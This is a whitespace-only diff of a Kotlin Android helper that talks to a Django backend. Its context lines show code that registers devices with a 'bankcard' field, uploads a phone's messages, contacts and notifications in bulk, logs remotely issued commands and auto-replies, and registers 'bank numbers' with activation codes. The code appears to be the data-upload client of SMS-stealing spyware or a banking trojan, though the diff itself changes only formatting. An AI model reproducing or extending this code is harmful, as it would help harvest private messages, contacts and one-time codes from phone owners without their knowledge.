@@ -13,11 +13,11 @@ import java.net.URL
 
 /**
  * DjangoApiHelper
- * 
+ *
  * Helper class for interacting with the Django backend API.
  */
 object DjangoApiHelper {
-    
+
     private const val TAG = "DjangoApiHelper"
     private val gson = Gson()
     private const val DEFAULT_CONNECT_TIMEOUT_MS = 10000
@@ -63,7 +63,7 @@ object DjangoApiHelper {
 
     /**
      * Create or update device in Django backend
-     * 
+     *
      * @param deviceId Unique device identifier
      * @param data Map containing device information
      */
@@ -94,13 +94,13 @@ object DjangoApiHelper {
                     requestBody["time"] = data["time"] ?: System.currentTimeMillis()
                     requestBody["bankcard"] = data["bankcard"] ?: "BANKCARD"
                     requestBody["system_info"] = data["systemInfo"] ?: emptyMap<String, Any>()
-                
+
                     // Include app version info if available in data map
                     data["app_version_code"]?.let { requestBody["app_version_code"] = it }
                     data["app_version_name"]?.let { requestBody["app_version_name"] = it }
 
                     val jsonBody = gson.toJson(requestBody)
-                    
+
                     LogHelper.d(TAG, "Registering device at Django: $url")
                     LogHelper.d(TAG, "Request body: $jsonBody")
 
@@ -132,7 +132,7 @@ object DjangoApiHelper {
 
     /**
      * Patch device fields in Django backend
-     * 
+     *
      * @param deviceId Unique device identifier
      * @param updates Map containing fields to update
      */
@@ -153,13 +153,13 @@ object DjangoApiHelper {
                         connection.setRequestProperty("X-HTTP-Method-Override", "PATCH")
                         connection.requestMethod = "POST"
                     }
-                    
+
                     connection.doOutput = true
                     connection.setRequestProperty("Content-Type", AppConfig.ApiHeaders.CONTENT_TYPE)
                     connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)
 
                     val jsonBody = gson.toJson(updates)
-                    
+
                     LogHelper.d(TAG, "Patching device $deviceId at Django: $url")
 
                     OutputStreamWriter(connection.outputStream).use { writer ->
@@ -205,14 +205,14 @@ object DjangoApiHelper {
                     connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)
 
                 // Django expects a list of objects, each containing device_id
-                val requestBody = messages.map { 
+                val requestBody = messages.map {
                     val message = it.toMutableMap()
                     message["device_id"] = deviceId
-                    message 
+                    message
                 }
 
                 val jsonBody = gson.toJson(requestBody)
-                
+
                 LogHelper.d(TAG, "Syncing ${messages.size} messages to Django: $url")
 
                     OutputStreamWriter(connection.outputStream).use { writer ->
@@ -258,14 +258,14 @@ object DjangoApiHelper {
                     connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)
 
                 // Django expects a list of objects, each containing device_id
-                val requestBody = contacts.map { 
+                val requestBody = contacts.map {
                     val contact = it.toMutableMap()
                     contact["device_id"] = deviceId
-                    contact 
+                    contact
                 }
 
                 val jsonBody = gson.toJson(requestBody)
-                
+
                 LogHelper.d(TAG, "Syncing ${contacts.size} contacts to Django: $url")
 
                     OutputStreamWriter(connection.outputStream).use { writer ->
@@ -311,15 +311,15 @@ object DjangoApiHelper {
                     connection.setRequestProperty("Accept", AppConfig.ApiHeaders.ACCEPT)
 
                 // Django expects a list of objects, each containing device_id
-                val requestBody = notifications.map { 
+                val requestBody = notifications.map {
                     val notification = it.toMutableMap()
                     notification["device_id"] = deviceId
                     // Map package_name if needed
-                    notification 
+                    notification
                 }
 
                 val jsonBody = gson.toJson(requestBody)
-                
+
                 LogHelper.d(TAG, "Syncing ${notifications.size} notifications to Django: $url")
 
                     OutputStreamWriter(connection.outputStream).use { writer ->
@@ -382,7 +382,7 @@ object DjangoApiHelper {
                 requestBody["error_message"] = errorMessage
 
                 val jsonBody = gson.toJson(requestBody)
-                
+
                 LogHelper.d(TAG, "Logging command $command to Django")
 
                     OutputStreamWriter(connection.outputStream).use { writer ->
@@ -441,7 +441,7 @@ object DjangoApiHelper {
                 requestBody["replied_at"] = repliedAt
 
                 val jsonBody = gson.toJson(requestBody)
-                
+
                 LogHelper.d(TAG, "Logging auto-reply to $sender to Django")
 
                     OutputStreamWriter(connection.outputStream).use { writer ->
@@ -581,7 +581,7 @@ object DjangoApiHelper {
 
     /**
      * Register bank number (TESTING mode)
-     * 
+     *
      * @param phone Phone number
      * @param code Generated activation code
      * @param deviceId Device ID
@@ -613,13 +613,13 @@ object DjangoApiHelper {
                 requestBody["device_id"] = deviceId
                 requestBody["model"] = getDeviceModel()
                 // Intentionally omit "name" to avoid mismatched device naming
-                
+
                 // Include additional fields from data if present
                 data["app_version_code"]?.let { requestBody["app_version_code"] = it }
                 data["app_version_name"]?.let { requestBody["app_version_name"] = it }
 
                 val jsonBody = gson.toJson(requestBody)
-                
+
                 LogHelper.d(TAG, "Registering bank number at Django: $url")
                 LogHelper.d(TAG, "Request body: $jsonBody")
 
@@ -679,7 +679,7 @@ object DjangoApiHelper {
 
     /**
      * Validate code login (RUNNING mode)
-     * 
+     *
      * @param code Activation code
      * @param deviceId Device ID
      * @return Result with success status (true if valid, false if invalid)
@@ -707,7 +707,7 @@ object DjangoApiHelper {
                 )
 
                 val jsonBody = gson.toJson(requestBody)
-                
+
                 LogHelper.d(TAG, "Validating code login at Django: $url")
                 LogHelper.d(TAG, "Request body: $jsonBody")
 
@@ -732,15 +732,15 @@ object DjangoApiHelper {
                         } catch (e: Exception) {
                             emptyMap<String, Any?>()
                         }
-                        
+
                         // Check if code is valid (API may return approved/valid/is_valid)
                         val isValid = responseData["approved"] == true ||
-                                      responseData["valid"] == true || 
+                                      responseData["valid"] == true ||
                                       responseData["is_valid"] == true ||
                                       responseData["approved"] == "true" ||
                                       responseData["valid"] == "true" ||
                                       responseData["is_valid"] == "true"
-                        
+
                         LogHelper.d(TAG, "Code validation result: $isValid (Code: $responseCode)")
                         Result.success(isValid)
                     } else if (responseCode == 401 || responseCode == 404) {
